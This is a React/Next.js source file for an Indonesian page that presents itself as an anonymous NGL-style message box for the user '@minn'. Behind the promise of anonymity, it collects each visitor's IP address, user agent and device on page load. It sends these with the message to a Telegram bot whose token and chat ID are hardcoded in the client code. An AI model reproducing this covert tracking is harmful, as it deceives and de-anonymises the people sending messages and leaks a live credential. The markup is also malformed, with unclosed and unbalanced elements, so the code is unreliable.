import { useState, useEffect } from "react";
import Head from "next/head";

export default function NGLPage() {
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [userInfo, setUserInfo] = useState({
    ip: "Tidak diketahui",
    userAgent: navigator.userAgent,
    device: "Tidak diketahui",
  });

  useEffect(() => {
    // Ambil alamat IP pengguna
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        const deviceInfo = parseDeviceInfo(navigator.userAgent);
        setUserInfo({
          ip: data.ip,
          userAgent: navigator.userAgent,
          device: deviceInfo,
        });
      })
      .catch((err) => {
        console.error("Error fetching IP info:", err);
      });
  }, []);

  const parseDeviceInfo = (userAgent) => {
    // Gunakan regex yang lebih tepat untuk mendeteksi perangkat
    const deviceRegex = /(Android|iPhone|iPad|Windows Phone|Macintosh|Linux|Realme C11|Samsung|Xiaomi|Huawei|Oppo|Vivo|Nokia|Sony|LG|HTC|OnePlus|Google Pixel|Motorola|Asus|Lenovo|BlackBerry|ZTE|TCL|Alcatel|Microsoft)/i;
    const match = userAgent.match(deviceRegex);
    if (match) {
      const deviceDetails = match[0].trim() || "Tidak diketahui";
      return deviceDetails;
    }
    return "Tidak diketahui";
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
    const chatId = "1516343905";
    const username = "minn";

    if (message.trim() === "") {
      alert("Pesan tidak boleh kosong!");
      return;
    }

    setLoading(true);
    setSuccess(false);

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: `Pesan anonim dari:
IP: ${userInfo.ip}
USER AGENT: ${userInfo.userAgent}
DEVICE: ${userInfo.device}

PESAN: ${message}`,
          }),
        }
      );

      if (response.ok) {
        setMessage("");
        setSuccess(true);
      } else {
        alert("Gagal mengirim pesan. Coba lagi.");
      }
    } catch (error) {
      alert("Terjadi kesalahan. Coba lagi.");
    } finally {
      setLoading(false);
    }
  };

  const closePopup = () => {
    setSuccess(false);
  };

  return (
    <html lang="en">
      <head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>NGL - MINN</title>
        <link
          rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
        />
        <link rel="icon" href="/img/icon.png" />
        <style>{`
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #0d1117;
            color: #c9d1d9;
            display: flex;
            flex-direction: column;
            height: 100vh; /* Menjadikan tinggi halaman penuh */
        }
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 20px;
            background-color: #161b22;
        }
        .navbar .logo {
            display: flex;
            align-items: center;
        }
        .navbar .logo i {
            font-size: 24px;
            margin-right: 10px;
        }
        .navbar .icons i {
            font-size: 20px;
            margin-left: 20px;
        }
        .content {
            padding: 20px;
            flex-grow: 1; /* Memanfaatkan ruang yang tersisa */
        }
        .content h1 {
            display: flex;
            align-items: center;
            font-size: 24px;
        }
        .content h1 i {
            margin-right: 10px;
        }
        .content p {
            font-size: 14px;
            color: #8b949e;
        }
        .card {
            background-color: #161b22;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .card h2 {
            font-size: 20px;
            margin-bottom: 10px;
        }
        .card p {
            font-size: 14px;
            color: #8b949e;
        }
        .card a {
            display: block;
            color: #58a6ff;
            margin-top: 10px;
        }
        .overview {
            margin-top: 20px;
        }
        .overview .item {
            background-color: #161b22;
            padding: 20px;
            border-radius: 10px;
            margin-top: 10px;
        }
        .overview .item h3 {
            font-size: 16px;
            margin-bottom: 10px;
        }
        .overview .item .value {
            font-size: 24px;
        }
        .overview .item .value.blue {
            color: #58a6ff;
        }
        .overview .item .value.red {
            color: #ff7b72;
        }
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #8b949e;
            margin-top: auto; /* Memastikan footer berada di bawah */
        }
        .footer i {
            color: #ff7b72;
        }
        .input-container {
            margin-top: 20px;
        }
        .input-container input {
            width: 100%;
            padding: 10px;
            border: 1px solid #58a6ff;
            border-radius: 5px;
            background-color: #0d1117;
            color: #c9d1d9;
        }
        .input-container button {
            margin-top: 10px;
            padding: 10px;
            border: none;
            border-radius: 5px;
            background-color: #58a6ff;
            color: #ffffff;
            cursor: pointer;
            font-size: 16px;
        }
        .input-container button:hover {
            background-color: #4a94d6;
        }
        .download-info {
            margin-top: 20px;
            color: #c9d1d9;
        }
        .download-info h3 {
            font-size: 18px;
            margin-bottom: 5px;
        }
        .download-info img {
            max-width: 100%;
            border-radius: 10px;
            display: block;
            margin: 0 auto;
        }
        .download-info a {
            display: block;
            margin: 10px 0;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            color: white;
            background-color: #58a6ff;
        }
        .download-info a:hover {
            background-color: #4a94d6;
        }
        .download-info button {
            margin: 10px 0; /* Memberikan jarak antara tombol */
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }
        .download-info button:first-child {
            background-color: #58a6ff; /* Warna tombol Download Video */
            color: white;
        }
        .download-info button:first-child:hover {
            background-color: #4a94d6;
        }
        .download-info button:last-child {
            background-color: #ff7b72; /* Warna tombol Download Musik */
            color: white;
        }
        .download-info button:last-child:hover {
            background-color: #e66b61;
        }
        .tools {
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            margin-top: 20px;
        }
        .tool {
            text-align: center;
            background-color: #161b22;
            padding: 20px;
            border-radius: 15px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .tool i {
            font-size: 40px;
            color: #58a6ff;
        }
        .loading-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #58a6ff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 2s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Pop-up Success */
        .popup-success {
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: white;
          border-radius: 20px;
          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
          padding: 30px;
          display: flex;
          align-items: center;
          flex-direction: column;
          z-index: 1000;
          animation: fadeIn 0.3s ease;
        }
        .popup-content i {
          font-size: 50px;
          color: #4caf50;
        }
        .popup-content p {
          margin: 10px 0;
          font-size: 16px;
          font-weight: bold;
          color: #333;
        }
        .popup-close {
          background: #4caf50;
          color: white;
          border: none;
          padding: 10px 20px;
          border-radius: 10px;
          font-size: 14px;
          cursor: pointer;
          margin-top: 15px;
        }
        .popup-close:hover {
          background: #45a047;
        }
        @keyframes fadeIn {
          from {
            opacity: 0;
            transform: translate(-50%, -60%);
          }
          to {
            opacity: 1;
            transform: translate(-50%, - 50%);
          }
        }
form {
  background-color: #161b22;
  border-radius: 10px;
  padding: 20px;
  margin-top: 20px;
}

.username {
  font-size: 18px;
  font-weight: bold;
  color: #58a6ff;
}

.message {
  font-size: 14px;
  color: #8b949e;
}

.message-box {
  width: 100%;
  height: 120px;
  margin-top: 10px;
  padding: 10px;
  border: 1px solid #58a6ff;
  border-radius: 10px;
  background-color: #0d1117;
  color: #c9d1d9;
  font-size: 14px;
  resize: none;
  transition: border-color 0.3s ease;
}

.message-box:focus {
  border-color: #58a6ff;
  outline: none;
}

.send-button {
  margin-top: 20px;
  padding: 10px 20px;
  background-color: #58a6ff;
  border: none;
  border-radius: 10px;
  color: white;
  cursor: pointer;
  font-size: 16px;
  width: 100%;
}

.send-button:disabled {
  background-color: #4a94d6;
}

.send-button:hover {
  background-color: #4a94d6;
}

.info {
  margin-top: 10px;
  font-size: 14px;
  color: #8b949e;
  display: flex;
  align-items: center;
}

.lock-icon {
  margin-right: 5px;
}
        `}</style>
      </head>
      <body>
        <div className="navbar">
          <div className="logo">
            <i className="fas fa-angle-double-right"></i>
            <span>MINN</span>
          </div>
          <div className="icons">
            <i className="fas fa-user-circle"></i>
          </div>
        </div>
        <div className="content">
          <h1>
            <i className="fas fa-download"></i> NGL - MIN
          </h1>
          
        <form onSubmit={handleSubmit}>
              <div>
                <div className="username">@minn</div>
                <div className="message">kirimi aku pesan anonim!</div>
              </div>
            </div>
            <textarea
              className="message-box"
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              placeholder="Kirim pesan anonim padaku..."
              disabled={loading}
            ></textarea>
          </div>
          <div className="info">
            <i className="fas fa-lock lock-icon"></i> tanya-jawab anonim
          </div>
          <button type="submit" className="send-button" disabled={loading}>
            {loading ? "Mengirim..." : "Kirim !"}
          </button>
        </form>
          
        {/* Pop-up Success */}
        {success && (
          <div className="popup-success">
            <div className="popup-content">
              <i className="fas fa-check-circle"></i>
              <p>Pesan berhasil dikirim!</p>
              <button className="popup-close" onClick={closePopup}>
                OK
              </button>
            </div>
          </div>
          
        <div className="footer">
          Made with <i className="fas fa-heart"></i> by Minn.
        </div>
      </body>
    </html>
  );
}